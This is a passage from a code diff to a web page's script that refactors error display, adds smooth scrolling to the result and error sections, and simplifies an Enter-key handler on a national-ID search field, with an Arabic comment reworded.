+            resultDiv.scrollIntoView({ behavior: 'smooth', block: 'start' });
         } else {
-            errorSection.style.display = 'block';
+            errorDiv.style.display = 'block';
+            errorDiv.scrollIntoView({ behavior: 'smooth', block: 'start' });
         }
     }
 
-    // للسماح بالبحث بالضغط على Enter
+    // البحث بالضغط على Enter
     document.getElementById('nationalId').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            searchRequest();
-        }
+        if (e.key === 'Enter') searchRequest();
     });
 </script>
-
 </body>
 </html>
